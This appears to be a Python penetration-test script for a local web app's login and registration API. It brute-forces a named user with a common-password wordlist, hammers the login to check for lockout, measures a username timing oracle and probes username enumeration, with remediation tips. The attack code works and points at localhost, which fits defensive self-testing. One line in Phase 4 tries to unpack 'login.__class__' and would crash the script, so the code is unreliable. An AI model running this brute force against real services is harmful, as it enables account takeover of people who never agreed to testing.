#!/usr/bin/env python3
"""
01_bruteforce.py — Brute-Force Login Attack
============================================
Tests whether the /api/auth/login endpoint:
  - Allows unlimited password attempts (no rate limiting / lockout)
  - Leaks timing differences between "user not found" vs "wrong password"
  - Accepts common weak passwords for any registered user

Findings to look for:
  VULN: No account lockout after N failed attempts
  VULN: Timing oracle (different response times reveal valid usernames)
  VULN: Weak default or common password accepted
"""

import requests
import time
import statistics
import sys

BASE_URL = "http://localhost:8090"
TARGET   = "CyberNinja"          # Change to any registered username

COMMON_PASSWORDS = [
    "password", "123456", "password123", "admin", "letmein",
    "qwerty", "abc123", "monkey", "1234567890", "iloveyou",
    "dragon", "master", "sunshine", "princess", "welcome",
    "shadow", "superman", "michael", "football", "baseball",
    "ninja", "cyberninja", "CyberNinja", "nexus", "arena",
    "chat123", "test1234", "test", "1234", "12345",
    TARGET.lower(), TARGET, TARGET + "123", TARGET + "1",
    "pass", "pass123", "Pass@123", "Admin@123",
]

FAKE_USER = "ThisUserDefinitelyDoesNotExist_XYZ987"


def login(username, password):
    try:
        t0 = time.perf_counter()
        r = requests.post(f"{BASE_URL}/api/auth/login",
                          json={"username": username, "password": password},
                          timeout=5)
        elapsed = time.perf_counter() - t0
        return r.status_code, r.json(), elapsed
    except Exception as e:
        return 0, {"error": str(e)}, 0


def section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def run():
    print("=" * 60)
    print("  NEXUS ARENA — Brute Force & Timing Oracle Test")
    print("=" * 60)
    print(f"  Target user : {TARGET}")
    print(f"  Server      : {BASE_URL}")
    print(f"  Passwords   : {len(COMMON_PASSWORDS)} in wordlist")

    # -------------------------------------------------------------------------
    # Phase 1: Common Password Attack
    # -------------------------------------------------------------------------
    section("PHASE 1: Common Password Brute-Force")
    found = False
    for i, pwd in enumerate(COMMON_PASSWORDS):
        code, body, elapsed = login(TARGET, pwd)
        status = "✅ HIT " if body.get("success") else "❌ MISS"
        print(f"  [{i+1:02d}] {status} | {pwd:<20} | HTTP {code} | {elapsed*1000:.1f}ms")
        if body.get("success"):
            found = True
            print(f"\n  🚨 VULNERABILITY: Weak password '{pwd}' accepted for '{TARGET}'!")
            print(f"  🚨 No lockout detected after {i+1} attempts.")
            break
        time.sleep(0.05)  # slight delay to be polite to local server

    if not found:
        print(f"\n  ✔  None of the {len(COMMON_PASSWORDS)} common passwords matched.")

    # -------------------------------------------------------------------------
    # Phase 2: Account Lockout Check
    # -------------------------------------------------------------------------
    section("PHASE 2: Lockout Detection (50 rapid attempts)")
    locked = False
    for i in range(50):
        code, body, _ = login(TARGET, f"wrongpass_{i}")
        if code == 429 or "lock" in str(body).lower() or "too many" in str(body).lower():
            print(f"  ✔  Lockout/rate-limit triggered at attempt {i+1}. HTTP {code}")
            locked = True
            break

    if not locked:
        print(f"  🚨 VULNERABILITY: No lockout after 50 failed attempts!")
        print(f"      Recommendation: Add Spring Security's lockout or a counter in Redis.")

    # -------------------------------------------------------------------------
    # Phase 3: Username Timing Oracle
    # -------------------------------------------------------------------------
    section("PHASE 3: Timing Oracle (valid user vs non-existent user)")
    valid_times   = []
    invalid_times = []

    SAMPLES = 20
    for _ in range(SAMPLES):
        _, _, t = login(TARGET, "definitelywrongpassword_xyz")
        valid_times.append(t)

    for _ in range(SAMPLES):
        _, _, t = login(FAKE_USER, "definitelywrongpassword_xyz")
        invalid_times.append(t)

    avg_valid   = statistics.mean(valid_times)   * 1000
    avg_invalid = statistics.mean(invalid_times) * 1000
    diff        = abs(avg_valid - avg_invalid)

    print(f"  Valid-user   avg response : {avg_valid:.2f}ms")
    print(f"  Invalid-user avg response : {avg_invalid:.2f}ms")
    print(f"  Difference                : {diff:.2f}ms")

    if diff > 50:
        print(f"\n  🚨 TIMING ORACLE: {diff:.1f}ms difference reveals valid usernames!")
        print(f"      Recommendation: Use constant-time comparison; always hash even for missing users.")
    else:
        print(f"\n  ✔  Timing difference ({diff:.1f}ms) is within acceptable noise range.")

    # -------------------------------------------------------------------------
    # Phase 4: Duplicate Registration (username enumeration via register)
    # -------------------------------------------------------------------------
    section("PHASE 4: Username Enumeration via /register endpoint")
    code, body, _ = login.__class__  # just referencing — let's do the test below

    r1 = requests.post(f"{BASE_URL}/api/auth/register",
                       json={"username": TARGET, "password": "newpass123"}, timeout=5)
    r2 = requests.post(f"{BASE_URL}/api/auth/register",
                       json={"username": FAKE_USER, "password": "newpass123"}, timeout=5)

    msg1 = r1.json().get("message", "")
    msg2 = r2.json().get("message", "")

    print(f"  Existing user response : \"{msg1}\"")
    print(f"  New username response  : \"{msg2}\"")

    if msg1 != msg2:
        print(f"\n  🚨 USERNAME ENUMERATION: Different messages reveal whether a username exists.")
        print(f"      Recommendation: Use generic message like 'Registration failed.' for both cases.")
    else:
        print(f"\n  ✔  Both responses are identical — no enumeration leak.")

    print(f"\n{'='*60}")
    print(f"  BRUTE FORCE TEST COMPLETE")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    run()
